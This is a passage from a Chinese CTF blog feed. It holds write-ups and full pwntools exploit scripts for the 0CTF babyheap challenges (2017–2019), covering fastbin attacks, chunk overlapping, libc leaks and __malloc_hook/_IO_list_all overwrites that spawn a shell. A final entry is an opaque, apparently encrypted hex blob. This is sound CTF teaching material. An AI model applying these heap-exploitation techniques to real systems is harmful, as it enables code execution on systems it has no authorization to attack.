start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------io_str_jumps = libcbase + (0x7fc707c647a0 - 0x7fc7078a1000)io_list_all = libcbase + (0x7f82cc242520-0x7f82cbe7d000 )system_addr = libcbase + libc.sym['system']sh_addr = libcbase + libc.search('/bin/sh\x00').next() log.success('system_addr = '+hex(system_addr))log.success('io_str_jumps = '+hex(io_str_jumps))log.success('io_list_all = '+hex(io_list_all))payload = p64(0)*4payload+= p64(0)+p64(0x61)payload+= p64(0)+p64(io_list_all-0x10)payload+= p64(0)+p64(1)payload+= p64(0)+p64(sh_addr)payload = payload.ljust(0xe8+0x10,'\x00')payload+= p64(io_str_jumps-8) + p64(0) + p64(system_addr)p.sendline('2')p.recvuntil('Index: ')p.sendline(str(1))p.recvuntil('Size: ')p.sendline(str(len(payload)))p.recvuntil('Content: ')p.send(payload)p.recvuntil('Command: ')p.sendline('1')p.recvuntil(': ')p.sendline(str(0x10))#gdb.attach(p)p.interactive() 结语：以上就是所有的五种解法，说是解法，其实只是一些小技巧而已，这道题漏洞点较多，所以可以运用的方法比较多，正常比赛的情况下pwn题顶多也就2种解法，非预期解很难实现。以上这些技巧都是堆题中经常碰到的，需要熟练掌握才能在比赛中游刃有余地分析程序的漏洞，而不是卡在漏洞利用上。。 参考链接：看学的师傅]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>0CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从2017/2018/20190ctf_babyheap看fastbin_attack]]></title>
    <url>%2F2019%2F06%2F09%2F%E4%BB%8E2017201820190ctf_babyheap%E7%9C%8Bfastbin_attack%2F</url>
    <content type="text"><![CDATA[之前写过一个2017和2018的结合版分析，但是最近把2019年的复盘了，觉得三个在一起吧，算是fastbin_attack一个较完整的经历路程。 先来看2017的题目：预览：可以看到文件为64位，保护全开，给了Libc，标准的堆题。。。看到full relro一般为改hook为one_gadget。放进ida里进一步分析： 主要功能分析及漏洞寻找：可以看到程序开始时先选了一段随机不可控的地址来储存heap列表的基地址（base_ptr）。紧接着就进入了死循环，打印菜单，输入选项，运行函数。逐个分析功能： allocate()功能中，我们发现heap的content大小由我们自己决定（小于0x1000），是可控的，且heap结构体中会储存heap内容的大小。此外，我们申请堆块时用的是 calloc() 这意味着堆块的数据开始时要被初始化为0，这一点需要注意 fill()函数就是向我们申请过的chunk里填数据，不过有一个很明显的任意溢出更改漏洞。 free()就是将chunk指针free()，没有uaf漏洞。 print()函数就是打印对应下标的chunk的content，不过打印的内容是根据我们在allocate()时输入的size来决定的。 思考如何利用漏洞：首先我们的最终目标定为：将malloc_hook改为one_gadget，现阶段，我们只能借助于程序自身的fill()功能来进行写，而fill()功能又需要一个堆指针，所以我们的目标转化为如何使堆指针分配到malloc_hook附近，我们运用fastbin功能与overlapping结合的方法来实现。 leak:因为我们要确定malloc_hook的地址与one_gadget的地址，所以必须泄露出libc。 泄露功能，我们可以利用程序的print()功能来实现，先申请4个chunk（chunk2大小为smallchunk），然后通过0来改写1的size，然后通过标准的overlapping方法，先free()再malloc()，然后chunk2现在在1的里面，(这里要注意，因为是calloc，所以再次申请chunk1的时候，chunk2的chunk_header会被清零，需要fill()重新布置一下)，然后free chunk2，将其放入unsortedbin中，然后通过chunk1的print()打印出chunk2的fd指针，成功泄露libc。(这一部分不理解的可以看我文末的心得，有我第一次做的时候查的资料，帮助理解。) change:之后我们就可以先把chunk2（大小我们申请为0x60）放进fastbin里，然后通过chunk1改其fd指针为&amp;main_arena-0x33，然后在申请两次即可，然后再通过改chunk4的内容来改malloc_hook，再申请则会触发one_gadget。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------#---------------2.change------------------p.sendline('1') #index 2p.recvuntil(': ')p.sendline(str(96))#gdb.attach(p)free(2)#gdb.attach(p)fake_chunk_addr = main_arena_addr - 0x33payload = 'a'*0x20+p64(0)+p64(0x71)+p64(fake_chunk_addr)fill(1,len(payload),payload)#gdb.attach(p)allocate(0x60) #index 2#gdb.attach(p)allocate(0x60) #index 4payload = 'a'*0x13 + p64(one_gadget_addr)fill(4,len(payload),payload)allocate(0x20)p.interactive() 再来看2018的题目：主要功能分析与漏洞寻找：和2017年的题目类似，有一些小的变化，一个是allocate()最大只能申请0x58的chunk（虽然条件变得苛刻，但是等于从侧面告诉了我们方向是fastbin_attack），然后是fill()不再有任意溢出漏洞，而是只有off-by-one漏洞，这不影响overlapping，只是方法要复杂一点。 思考如何利用漏洞：leak:第一步肯定还是先想leak出libc，但是这个可能就有点小麻烦了。。。我们首先想到老方法：overlapping之后用大块打印小块的内容，但是小块一定是大于0x80的，所以我们不可能打印出小块的全部内容，我们也只需要fd指针位置的内容，这一点是可行的，但是因为chunk大小的限制，我们必须经过精心构造，来绕过检查。做了其他的fastbin_attack的题目后，又用了新方法：两个指针控制同一块chunk。。。。先将一块chunk（overlapping的小块）放进fastbin，然后利用overlapping的大块改其的fd指针最后一位为我们想要的重叠位置的chunk的地址的最后一位，因为内存页分配原则，导致他们地址除了最后的一个字节不一样，其他都一样。再malloc两次就完事，然后当重叠的chunk被free以后，还是可以通过另外一个堆指针来打印fd的内容，进行泄露。 change:这里也要注意，因为chunk最大为0x60，所以原来的直接把&amp;main_arena-0x33位置放进fastbin里已经失效（size为0x70），需要想别的办法。。。这里需要改top_chunk的地址(这里做的时候没想到。。。orz)，首先要知道top_chunk的地址在&amp;main_arena+80，而在&amp;main_arena+80和&amp;main_arena之间是用来存放fastbinY的，其值是fastbin中各个大小的的bins的头指针，如果全都没有的话则全为零，所以我们必须要一个chunk（其大小不能太小，不然离&amp;main_arena+88太远控制不了）来压住，并利用其来伪造出fake_chunk的size。然后我们可以将fake_chunk设在伪造处，然后fill()更改top_chunk的地址为我们计划的地址（&amp;main_arena-0x33)，再次申请一个chunk（大小可以覆盖到malloc_hook）即可，然后再fill()更改其值。 exp如下（leak用的新方法）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc-2.24.so')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(length))def update(ID,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(len(payload))) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def view(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))#leak出libcsize = 0x28allocate(size) #index 0allocate(size) #index 1allocate(size) #index 2allocate(size) #index 3size = 0x80allocate(size) #index 4payload = 'a'*0x28 + p8(0x61)update(0,payload)delete(1)allocate(0x50) #index 1delete(0)payload = 'a'*0x20+p64(0)+p64(0x31)update(1,payload)delete(2)payload = 'a'*0x20+p64(0)+p64(0x31)+p8(0xc0)update(1,payload)#gdb.attach(p)payload = 'a'*0x20+p64(0)+p8(0x31)update(3,payload)allocate(0x28) #index 0allocate(0x28) #index 2payload = 'a'*0x20+p64(0)+p8(0x91)update(3,payload)allocate(0x80) #index 5payload = 'a'*0x20+p64(0)+p64(0x31)update(5,payload)delete(4)view(2)p.recvuntil('Chunk[2]: ')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - 88log.success('main_arena='+hex(main_arena_addr))#gdb.attach(p)libcbase = main_arena_addr - 0x3c4b20one_gadget = 0x4526aone_gadget_addr = one_gadget + libcbaselog.success('libc=' + hex(libcbase))log.success('one_gadget='+hex(one_gadget_addr))#gdb.attach(p)#改malloc_hook的值为one_gadget'''#gdb.attach(p)payload = 'a'*0x20+p64(0)+p64(0x71) update(1,payload)payload = p64(0)+p64(0x81)update(2,payload)delete(0)payload = 'a'*0x20+p64(0)+p64(0x71)+p64(main_arena_addr-0x33)update(1,payload)#gdb.attach(p)''' allocate(0x48) #index 4delete(4)payload = p64(main_arena_addr+37)update(2,payload)allocate(0x58)delete(4)allocate(0x48) #index 4#gdb.attach(p)allocate(0x48) #index 6#gdb.attach(p)payload = '\x00'*35 + p64(main_arena_addr-0x33)update(6,payload)#gdb.attach(p)allocate(0x48) #index 7payload = '\x00'*0x13 + p64(one_gadget_addr)update(7,payload)#gdb.attach(p)allocate(0x48)'''allocate(0x60) #index 6payload = 'a'*0x13 + p64(one_gadget_addr)update(6,payload)'''p.interactive() 我第一次做两道题的时候的一些心得：2017-0ctf-babyheap: 这一题准备自己独立做的，结果只能相出大致思路，不会leak无法入手，看了writeup，学会了新姿势，也对fastbin attack有了更深的认识。 leak出libc的方法除了泄露got表外，还有另一种：通过泄露main_arena来泄露libc。详情见链接： 利用main_arena泄露libc __malloc_hook为函数指针，当其不为NULL时，优先调用其指向的函数，一般有堆题又开了full relro的基本为这种，或者是free的。 fastbin attack我的体会是其先free将chunk送入fastbin，然后如果有uaf的话直接改写其fd指针，没有uaf的话就通过溢出或者overlapping（需要off_one_by）来改写fd指针，然后再malloc使堆指针指向我们计划好的地方（这里需要注意要通过fastbin的检查，fake_chunk的size要和malloc(size)的size一样）。 fastbin的大小范围（总大小）为大于等于0x20小于等于0x80。 unsortedbin 的一些体会：ptr=malloc(0x80)，free(ptr),会被分到unsortedbin中，unsortedbin的结构图在上面的链接里有，其是在main_arena+88处 main_arena又在libc的data的段里。 当malloc()时，当fastbin里没有大小正好合适的chunk的时候，会从unsortedbin中找到大小大于需求的块切割了分给用户，剩下的继续留在unsortedbin中。 当free(smallchunk)时一定要注意不要被topchunk合并，并且不要触发unlink。 calloc()申请的空间会全设为’\x00’ 2018_0ctf_babyheap: 这一题算做出来百分之80，因为有2017年babyheap的经验大致思路有个轮廓。 不知道为啥exp得多尝试几次才能成功，有时候会报错。？？？ 对堆的利用有了更深的理解： leak的方式： 程序自带的打印功能，这又分为几种情况： 打印字符串（常见的有name，host等等），注意这些字符串输入的时候有没有最后 ‘\x00’ 的缺失，如果有的话就会泄露之后的数据；还要注意其是不是用strcpy()输入的，如果是的话，可能又会有漏洞。 打印功能的函数，目前碰到的有两种情况： 打印存在堆上的content的内容，而堆指针不知道在什么位置，这种一般是利用其泄露&amp;main_arena+88的地址。 打印存在堆上的content的内容，而堆指针知道在什么位置（bss段）或者也在堆上，然后通过unlink或者其他的方法（程序的edit功能漏洞）将堆指针改为函数的got表（一定要是调用后的函数），然后泄露函数实际地址进而泄露libc。 自己构造泄露，需要先通过操作实现change的功能，然后通过(比如）free(chunk_ptr)，先改free_got的值为put_plt，然后将chunk_ptr的值设为某个函数的got表，就泄露了那个函数的实际地址。 edit的方式： 程序自带的edit功能，可能存在off-by-one类漏洞（一般之后为chunk overlapping），或者直接不限制大小直接输入。 程序在申请chunk的时候就会输入内容。 2019_babyheap:分析功能和寻找漏洞：首先这道题libc是2.28，所以带有tcache，我们不要忘记了。 emmm。。。首先我们在准备函数里可以看到程序随机出一段地址，并用mmap申请了0x1000大小的内存，不过最值得我们关注的是其申请了一块0x1f000大小的堆内存，这让topchunk的大小落入我们有望消耗殆尽的范围以内，然后接着分析可以看到程序四个基本功能都有，new，delete，upgrade，view都齐全。 在new里我们看到最大的size限制到了0x58（和18年一样），然后个数限制在16内以内，除此之外，还有一个需要注意的问题是new用的是calloc()函数，这个函数直接调用了_int_malloc()，其和malloc()不同，其没有_get_tcache()的调用，所以我们new出的chunk只会从bins里取，不会从tcache里取。 在upgrade里我们可以发现一个off-one-null漏洞。 在view里就是打印。 在delete里就是free并清零。 分析漏洞及利用：综上所述这道题有off-one-null这个洞并且有view功能的话，leak出libc很明显就是用chunkoverlapping，但是现在的问题是要使用off-one-null的话必须使chunk的size是三位数（不然size直接变0了。。。），所以我们必须想办法破除size是0x58的限制，想办法获取unsortedbin中的chunk，再结合准备函数里的malloc(0x1f000)，可以想到是不断申请chunk释放chunk将topchunk消耗殆尽，然后调用malloc_consodilate使fastbin中的chunk合并获取unsortedbin_chunk，之后就是常规套路的泄露和带有tcache的house of spirit。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def upgrade(index,size,content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)def view(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index))def delete(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))#---------消耗topchunk,在消耗的同时使用off-one-null加快其消耗----------- size = 0x58for i in range(7): new(0x58) upgrade(i,0x58,'\x44'*0x58)for i in range(7): delete(i)#--------------------------------------------------------------------- size = 0x48for i in range(7): new(0x48) upgrade(i,0x48,'\x44'*0x48)for i in range(7): delete(i)#--------------------------------------------------------------------- size = 0x38for i in range(7): new(0x38) upgrade(i,0x38,'\x44'*0x38)for i in range(7): delete(i)#------------------------------------- for i in range(8): new(0x58) for i in range(1,7): delete(i)#---------------------------------------------------------------- 开始精准控制top大小for i in range(5): new(0x28) upgrade(i+1,0x28,'\x44'*0x28)for i in range(5): delete(i+1)for i in range(5): new(0x18)for i in range(5): delete(i+1)new(0x28) #malloc_consodilate 1delete(1)#-----------------------------------new(0x28) #1upgrade(1,0x28,'\x44'*0x28)new(0x58) #2new(0x58) #3new(0x58) #4new(0x48) #5new(0x48) #6new(0x38) #8delete(7)delete(2)new(0x28) #malloc_consodilate 2new(0x20) #7view(3)p.recvuntil('Chunk[3]: ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f2a7d54dca0-0x7f2a7d369000)log.success('libcbase = '+hex(libcbase))#--------------leak down and start house of spirit-------------new(0x58) #9delete(9)upgrade(3,1,'\x5f')new(0x58) #9new(0x48) #10delete(10)fake_addr = libcbase+(0x7f47cdf6fc60+8-0x7f47cdd8b000)upgrade(4,8,p64(fake_addr)) new(0x48) #10new(0x48) #11 payload = p64(0)*5 + p64(libcbase+(0x7f23fdf77c18-0x00007f23fdd93000))[0:7]upgrade(11,len(payload),payload)upgrade(3,1,'\x00')for i in range(5): delete(i)new(0x48) #0new(0x48) #1new(0x48) #2new(0x48) #3new(0x48) #4new(0x48) #12one_gadget = [0x50186,0x501e3,0x103f50]'''0x50186 execve("/bin/sh", rsp+0x40, environ)constraints: rcx == NULL0x501e3 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x103f50 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''upgrade(12,16,p64(libcbase+one_gadget[2])+p64(libcbase+libc.sym['__libc_realloc']+4))new(0x10)#gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>0CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[to_do_list_of_next_stage]]></title>
    <url>%2F2019%2F06%2F09%2Fto-do-list-of-next-stage%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 5f0fc61e0fbe17023dbe555d6ce3b75ef4eb905f0e7b8a214f8712a5b8b87cbfd9fd4bbf15bba0f8201d02786944bb353ced2787bfaf23f69f8aa6d68854d1422b26933ede04d0fb813549dd5e7b48c7a741684d58d630922f9762a6ab8b06c4d5510fb3845418fe5c52a29ed17e126fbee0a697fd72f2c57b717240dea878ffe26f750aca8ec6f2943054e99df88051270aefcf837f0d100f92c52088c0a60a80222eec07953e631fddb9b59a2aba444b13115df0e4b82ae38c8239ddccda240f74b6d3d02be576384ad952459ce7b3a8e5d95650c31bbd3a5ab2e82526a01b4d72ee9b80efa80e4ca3d02aeaabf1d1d6824e9be388e71a61ad2327857836a1b56940d0b30eaa738d5b33f43bcec6d11ae790c9227c641a24cb20041f48cd500c96b9d0d631cfae72119505dbd5d856959af00dc9bae6209b6a858f75f08d5beb56f0b01dcfdfc3df561b5e1fe932a418965fb3b35d8e55aded46ae989bbc336c7c998d1670fdb2aabecd82cb330a8ddfcde79be56262ab0c7ce9674e456b25ad1190e99f4e21ab27bf909b97e5ce80667ee8cabc0ba4eba6f49c65dbc84b3717ef547992609fe95a1d78d11f657f30bdf4ddc31e13fd1014c902e0ebc64ef263fe31f6ad42d23380c5a11986bc84289c6f10ccabb3e492878577ed04dcb5abb983c6f7ca3f46d080cbe2c318db7f21400043debc6b4c2a35e4ad090e3233546feea7957109ceea8a53735a16a5afd6f20ffa8a1e50fb624d4bbf53ad7194573d264dff3e0a000cf07019ad8fceb60401ed8ac0b66bbd8285397c7ddf05064e04152d5b18df4b68e24f00ae5c130216e8bb0c595807cd97c6cdf97b955ace4fe77939ebdf3b7a15f7e1d0c4d303e12d79296e1d756d28053ed02785ef1d70339caf97c108aa8e2f455b548aedc82fad94644c98b9febd986b9a7695ab068b979a59c9347c15aaea0ca3bec44ae154c8abbbbc0fb22fd91ea57ca38998f2761760331dc5752c69c41755b7541bd14c3da6fd05f45851460c8ea04be368f6bebb71c53a592d57f1a4b74c63f39bd877e56125c60138052df69cdef688633b631fe3eabab665a7450d543f4b2f599fb15b45db004423895190fa8a5b72683b2d3c927eb3a96a3a4bf793de6a6e4cf1cebcfa79ba46155250f69d6025abc9eac31ac59a3e2f389f333ed4788474d3ad30e8e097daca21bd6ecaa25fdde2ddb69e7d22b9440229abf1900bcbdc3f9ed92bb1f61566932ae7cb7c02e8c736670568a003758ee4f7335b169466ab3f7f04f397084357cff8388c8f71a0398315dded4271a37d4b8efd4dc0ed15fafcfb4c502557d6a59a1394f8b3f1b80e9e0c6fc1d7d8f71baee0cc78811f2d28348a2359849cefe3189ca0f4ce9df8c0b00fb1f17ef0acedc0a5dccc598950c113f51e6a57755c06125451103d8714358441a58635dd8760b5c0b0e2454beefd8ae10812089c57b04ff2bbe11aca5a0d3a5dd851ca9d10b47ad103ae95eb6efbb79f4b29bb0a5ce06504ed339800a4d7cc4ba5a2460a0e75ec55533b5bebdd5cee659ad84a01cdc3266ef89b5fd6550a1c0fe3309066515e280aa64580a35697ee46ef17a3387d11d5698336cb64500b61023baf4781b24c82d76c932c4c32bf22cc58e3896030ec0cc4d040f67fc6dc962b6876deeaf894632ae94a2d9fd05761eaceaefc5f395fb410416f5124c15bf26ac297c8807a49e122b04596f80fd0301fa9302e919c8e7403d2c967bd0948fefc30cd3f826a7f391ac87b31a3b75fa2dd5182903ced3b4493f12df45a953e1fd87832852993091157481d886b664ecbe7bb97047f19a3cbd9819adaf713b1ad905f75ff6d99156cd748569bca296e1b44b31ac45e87c5ce79000979ca0178226c68211634fd27f1abfe269b9d09c6301d88c3a0e0d1557786dd924b2355e2a31e82b0ccbbfbc6f972c194734496654eaf021e1c265a68ea6ab932caa0b7473b02a0ec98c8b7bd6c220b884ac3c3aa302008a2922406ec5e95fd22b5f91238a89ce4066af43098bd6cc18a9468b75f02d7eeb2af1a42487ce85bec5a180841b48f950126b3482207955a99fd117a912232268e872091483e0f4a57d623c8faa307dcbbbf801063a99130058fd99dcf5d0a848edac3b127769c5ae8de9ac1eb714109e5b6b62ce3ed9053f903c11d6d868c18a3d8da00133a3b9c81cf297f1f162152b36be0b2bd8206efe3ad89ab37eecbef7aaf289e595699a03423ac26729ec656d12755efeddd79cf0acafb23abe4abc9a139bc6978cbe7613f7079c4ead4c6b2be6d6d7a9adcb9b8cf4707a2c1c064542861513428c66f108fe4a3506d9045336aa4cc29094a0c81dca0fa17fc183d1ef1b9d03d30523243a1f7909bd7929b43ddabe511b226d70d7f6baa1e01813a59b5c93cf8c6054f99a5f45f9047ae37d4e764614f9766c3b18ed465c78b46e8e559435e39cfd641ea9e3411889f3bed18078c06f56696de7aea99dc9ca452c4fc392dc26a00a7f89ec30142dda5900fa63d85279f3660b79bebd9e4b07d0fa05f2df4b551bfd46632fc8ee110283d101e5dce7801ed3d1d5edb92c5ce9ce0544338bd3859c478d5a80514eff43cc3996476cdf10d4d8506f8e9bccd58993cbb3e0e90ba7230949bc187bc74ee4cead77dd8ffb5a9fefd941f5e858581b846cf3c6044ba9159394a1a6a8d4b09a3160134cb65f92afe9e66dbc0487ce72fb12db88fb2ef0c6fd4a418d5899ff590832b90e8a08951098973aa0d34944cc468005a1a30c8cf86b13f2cf3df9bc89942f8a21b46d86d7f8e822397b811bccebf34fbcd253becb74f4513469f8b55d8d93bd3a0cb316ee25e05f4151283049e93b8374a129c7562490ee62e81758f995554cba38a4ee757db670baca616efdb89ff36a1eb674593ff8ce649243fc078929a8dd155c61204f4761eb4c4459079025aefeffad8a137906395ede0ece2494f7e4189c7518aa2af3ebf1d0b08e74e13b7cda9e5c508d355258380f541705d1c2ada6eb4346f68f9e3134716f2de2a3c3c81f8c0c290794c5e7c7cde90ec8852fc70e41ab769f84ecff852935c8ccbf69b738a0a6daf04c6a1898dd6d4bafa860dc59edcfde01913708f3e72507386f2bb735ea2f0631ceba1e21d72cd9ad2a69342eede132fbd309377c9d4e02cd89a6421f62a22169bba5d9adfb9b1952a7b4f2141964db2a010d8e8d86b8027d2c7659bb7038b2d97c5f56bac66689df70369610840135f12cdccd20bfd69ce147f49b14c1b877286c0d1a71a062e0751b1b80200b972bb524efe5a96a19dba560cb8e5c9c4496b754255be605fee94f66d8688a0dc83d2e3fab6e1238f64c554be7c943790b4cb911ac02a9f06d89657069cd8bcda457024967c89db9058fab231816f4ec69b7eaf45e106443c52d29b48ca8cfce2e5c6dc0530584b5a18651768d1b483e7533d2c7b2cedea70a2b2bd7e4a6a53c0ff5b9758f147270bb3b60374c012f508dcf8674d70ec7abb6cccec074e64f0694c5c03da32a94e461315cd249922f11afd5e0534b0d8e52b0f3fc01632bdcb33cb96fae8d1983df08c7655ee0039636e2f1e571ea05a18bdcffbfdbca26db6f32d97992da7211fa9e48496f134a1c1453feaacfecabcc9767473711e4d12c3f0387b91f131037ea2060346837a21e70f30deb0c711cb073565a6e0e80ec4aad72ec2766667479d40f33db45bdb426c8d50132b92f7826031cd8e56b981cefca465e8461efb2acbc737e20ffed5facb714dd405d58c0b63b9f61b22538d1ffede42b7a06e1548639c30c780623a86fe00fae39038ee1a182f529ce3631a738a9398cffc4964ebcdc3edaba3ac8179d3b0767826780f7c819af1affc8d258ac68c3c0db1d78e70e0240c9eeefa28b8b872161f0c34e13139f51c08f8897497b73d20297eeea9e7db170063b63722b29987c5f87619836e73aebd30398c8d734989bbe89bcfe221abc881c7c76d7d8ed204707636b30dd4659d9cf2998564422008a42de74e2338a3e14d4abcecd00fe68a82f5b87730a3baee9847c02d8c0abb4c181e7aa0442cbba69ed676f5d80d83b5800fa320bee2be66123e16de290387e3e9ff3e5f347fb7047e71a6a979f332b468766403248ab4b631c8cfc0584763d82be359be15ac7d09a7fc12e568c4f9989eb06eda6ce9b87166dc8ebb49376b8d30aed6ff1f55c96096c06009f46ae878579b04b5e7f9affff83178d65dd03844ce25201b1ec13e835bfd68aeb92003021420c7a4bd7f1c633fbb7bb1f30bb8a9b2860a22e0e831d69278e8bd987360f097ee8b9b83adef10349e2d3702e66bba65fbb19a67d23fc0317aaa3f3e5ceb5897a1ce3bb21716d643a95cc1392404dabdfdff3388b9977cdd377269469c9e90000e8f7dc1d9c066495b346a9559c12de2626274a45a365812d868fa6cd3e32f4795a21b18a7c7578dc57aa39b417a5050c62605afd5ca7c777f8cc589dfba384d2eb928dd3b73df43735d6fdf3f8b818948b870679f075dae97a6f1c09a7ca8d2ac0553170b357451b07d6e6eacb0927d53241becaa5c8ef6b5cb714a9a5fec592eff890deb72a906aa8f3f96e2049891a4907f5c44501a3f32104e34eff817436cef2649df79602cb791fdef67eadd1db5af794c5fb70d4096907557b85be51387d3aa1ccd98fa0e88946db92e78d39ce76c47bcfae266c3e06ef595acd116ad2cb66b6394a185c35d113654f0b638d9c38652fffdf7d60167a1a3933a2946a1654c8244670c2efcbd8a8283426f604926aaf983f612c160cfe59b49cd8690bc0ceb15f168f71304100a0a8d3ba40eff88988451d97dcf8ff6f1922c55d19401642537be95cf8e48cf2ae417fa21f40c3441770bbd70b353ba6f702acc7730fb368be386506ecf62f5dd03076ffd3ee514ac73c9a9c382d1fede81368e1cca86d2b8ef37535558dfb7d18d97e7de4f1b5af2d30e80557c7507ddd38f5b2a300af6ee0cb2f3aa1d791cf4b78df520aca72cec26280a865e889f844e1688d3a0133ba0571ce5ed40f5351d60f54beb9341e2ad8a30b68a41119f31fe2cc0ac916db28b529af81cc37064ff2c41473d0856c0052e199f7ccfdf5a71c32c1c3fe7b54dacd5c54298e0cef7fdd37fc48bae6f62c974ddd3d2f094a011357f526f389ff431723a4f74ccca0aded72ab535b8e448467d4fccb37d12b3e8a74988bef5e8d657933f6069edf60c892c7df12b2aeb14de52f8be609edca7593a3e7b2f38661e88d319dcaca826f5e4670dcb7fb3ee0419b3fa1612a2d1b94e0c4a897bc2578f0231c2a0378604b6cd19c77421c6ec81ceffb623d708c9d1bd4152a76b24fd97f073c5d5d104564f872ee4d14bc15c38457d34e43c9c21f66c2b6968af6e537bd435d2bf07870bd20a9b71d8cb878f54abeffec3a636563d450fd6a7881d233865fba24e37a603ce3262406aefe165edb09f1ac7269e5d69b5d3701a1994ed52b4104af85353cb56aab03e8113847060a25217aed93667bcc8ad3bc1e70ae0f6925381e953fe6f0431bc788c7122b6a4071ee26a316c3caad53a81d9320cee8cc4217bc78eff0572a1b33a18ed1d6378461c3d80e918250ac7141c7691f43075f7643cfa5250c56cfdf6302f4aa9699cc873b57e6db5e90a526d0a24670ff665bd833b2816de4df6f3569a62e4ac7d12ae1b8aad4932140b9b8f4f7ae815e01b1b17488902b101369fa7fa4ac3c3be1de63820b3b230fffcf050a89c2640dfc3ae23f22a2bb89ffebc77caafd5b64e8c88bddd3b0bd8d659d2bb48b34bdc2d184d845818c56c2e36ab315cdeecf65d140b013296fc1edbd21bec644700f29875f53d8fb8ca47013ecc7c4e25521ed4bd109922efde70c7697e78707364adcb136e97c241f4bfb01790ba13bc3a376308605f97abf8322ec581682e97f24990f7de57832f90c214fa8ba1b24313a22e22428d80f963f661561417bcc4b690393cb1ef3feccb85da87a7a30efba9390ef86504e5890096b15fa94167c306e93be28b49516025bea3e454f9100e3eb4b6b13ecc5e1c8d8eae4dde2540d1203b22034005da24e59d24690d4b4cfe60c166c83d4192f81c34c464a7b23ad5cd12d69dd02282eceb6eeee2a9e6546112593bf10fe016e911974e605879831893c5958e627ac9f5b5d133a66a5a477175face761e86dacaaf36f25914ef616c13e541b738ab5559856a8782728c6e396346f99ade3efbc3c1a7fd44994ca8256aa1e6139a4478b8a337a008e03b7979b9d48b586f05a28a8335e535e187525cf380865198de38a703e699d767223887415e0d3345e2d15c73deae7356db819150fca707ce5f9a10cdbb0a71223916c28e3c524ec7fc649a54e7c966bb4c2f5226214d013d3686d25ac48ffe9d1cd75e09cf96c6e1d76b7f